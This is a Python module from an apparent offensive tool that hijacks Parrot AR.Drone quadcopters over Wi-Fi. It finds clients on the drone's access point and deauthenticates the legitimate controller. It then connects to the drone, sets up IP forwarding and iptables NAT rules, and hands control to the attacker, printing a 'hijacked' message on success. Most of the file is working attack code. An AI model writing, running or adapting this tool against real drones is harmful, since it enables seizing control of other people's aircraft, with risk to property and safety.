#
# Parrot AR.Drone hacking tool
# Inspired from https://github.com/samyk/skyjack/
#

from multiprocessing import Process
import time

from .wifi import WifiManager, AccessPoint, Client
from .ext_exec import do
from .menu import Menu
from . import disp



# ==================================
#    Parrot AR.Drone hacking tool
# ==================================

class ParrotHacker:

    def __init__(self, parrot_ap, wlan, mon):
        """ Initialize the Parrot hacker class. """
        # Init vars
        self.wlan = wlan
        self.mon  = mon
        self.ap   = parrot_ap
        self.clients = []

        # Init menu
        self.menu = Menu(
                    ("Hacking menu for", self.ap.short_str()),
                    ("Your choice:"),
                    exit_opt_msg   ="Go back to main menu (exit hacking menu)",
                    no_num_opts_msg="No client detected. Try to search for new connected clients!",
                    exit_on_ctrlc  =False
                )
        self.menu.add_static_opt('R', "Refresh clients list", self.search_new_clients)
        self.menu.add_static_opt('T', "Take control (no connected clients)", self.take_control)
        self.menu.add_static_opt('C', "Clear client list", self.clear_clients_list)


    def __str__(self):
        return self.ap.__str__()


    def __eq__(self, other):
        return isinstance(other, self.__class__) and self.ap.__eq__(other.ap)


    def hack(self):
        """ Hacks current AP. """
        # Search for clients
        self.search_new_clients()

        # Show menu
        self.menu.run()



    # =======================
    #    Client management
    # =======================

    def clear_clients_list(self):
        """ Clears client list. """

        self.menu.clear_numbered_opt()
        disp.info("Parrot hacking menu entries cleared")

        self.clients = []
        disp.info("Client list cleared")


    def search_new_clients(self):
        disp.info("Searching for connected clients to Parrot AP", self.ap.ssid)
        self.mon.search_clients(self.ap, self.register_client)


    def register_client(self, client):
        """ Register a client to this Parrot AP. """
        if client not in self.clients:
            self.clients.append(client)
            self.menu.add_numbered_opt(
                    ("Disconnect client", client.ip, "then take control"),
                    lambda: self.deauth_and_control(client)
                )
            disp.item1("Found client on", client)



    # =====================
    #    Hacking methods
    # =====================

    def take_control(self):
        """ Takes control of the drone. """
        # Connect AP
        disp.info("Connecting to drone", self.ap.short_str())
        self.wlan.connect_access_point(self.ap)

        disp.info("Acquiring IP from drone")
        ip_ok = self.wlan.acquire_IP()

        if ip_ok:
            disp.info("Well done! You've hijacked the Parrot drone! :)")

            do("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
            disp.debug("IP forwarding enabled")

            do("iptables -t nat -A PREROUTING -d 172.20.1.10",
                    "-j DNAT --to 192.168.1.1")
            do("iptables -t nat -A POSTROUTING -o", self.wlan.card.dev,
                    "-j SNAT --to", self.wlan.get_IP())
            disp.debug("NAT enabled")

            disp.info("You can launch on 172.20.1.1 using:")
            disp.info("  export DEFAULT_DRONE_IP=172.20.1.10")
            disp.info("  node app.js")
            disp.info("Press Ctrl+C when you are done")

            try:
                while True:
                    time.sleep(100)
            except KeyboardInterrupt:
                pass

            do("iptables -t nat -F")
            disp.debug("NAT disabled")

            do("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward")
            disp.debug("IP forwarding disabled")

            self.wlan.disconnect()


    def deauth_and_control(self, client):
        """ Disconnects a client then take control. """
        # Disconnect client
        disp.info("Disconnecting client", client, "from AP", self.ap)
        self.mon.deauth_client(client, self.ap)

        # Take control
        self.take_control()

